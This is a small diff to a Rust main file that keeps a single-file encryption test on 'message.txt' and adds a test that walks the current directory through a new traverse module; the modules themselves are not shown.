@@ -1,10 +1,16 @@
-use std::fs;
+use std::{fs, io};
 mod crypto;
+mod traverse;
+use std::path::Path;
 
-fn main() {
+fn main() -> io::Result<()> {
 
-let file_path = "message.txt";
+    // single file encryption test
+    let file_path = "message.txt";
+    crypto::encrypt(file_path);
 
-crypto::encrypt(file_path);
-
+    // directory traversal test
+    let root = Path::new(".");
+    traverse::visit_dirs(root)?;
+    Ok(())
 }
